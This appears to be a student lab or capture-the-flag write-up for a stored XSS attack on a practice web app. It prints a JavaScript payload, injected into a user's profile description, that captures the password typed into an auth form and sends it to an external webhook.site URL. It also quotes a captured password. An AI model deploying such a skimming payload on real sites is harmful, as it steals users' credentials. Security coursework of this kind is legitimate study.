# Attack 3

This attack uses an XSS vulnerability, and changes the functionality of the submit button to send a request to our webhook.

The script first executes attack 2 in order to get the session key, then it appends our javascript code to Jonas's description if it doesn't exist.

From then on, every 30 seconds the script checks if the webhook has been received, if not, then it checks if the XSS vulnerability is still in the description. Updates if it's not there.

We used webhook.site as our cross website.

The script we wrote looks like this:

```javascript
document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("authForm").addEventListener("submit", () => {
        const key = document.getElementById("authPassword").value;
        fetch("//webhook.site/c60e8309-2035-4484-8777-121da40750d6?key=" + encodeURIComponent(key));
    })
});
```

And the complete inner HTML `<textarea>` looks like this:

```html
The most friendly employee in the company
<script>
//eiunrg9ea8gnq780b4387

document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("authForm").addEventListener("submit", () => {
        const key = document.getElementById("authPassword").value;
        fetch("//webhook.site/c60e8309-2035-4484-8777-121da40750d6?key=" + encodeURIComponent(key));
    })
});

</script>
```

The id `eiunrg9ea8gnq780b4387` is used to check if the script is still in the description or not.

When a webhook is received, it should be visible in webhook.site's JSON path: https://webhook.site/token/c60e8309-2035-4484-8777-121da40750d6/requests?page=1&password=&query=&sorting=newest

***NOTE:** The webhook url currently used will expire 2023-12-16 05:52:35. You need to update the url if you want to test it after that time period*

Located in `data["data"][0]["query"]["key"]`.

The python script should then print the password in the terminal: `jeg!Har%Mest&LystTil&At%Være-En-Hacker`
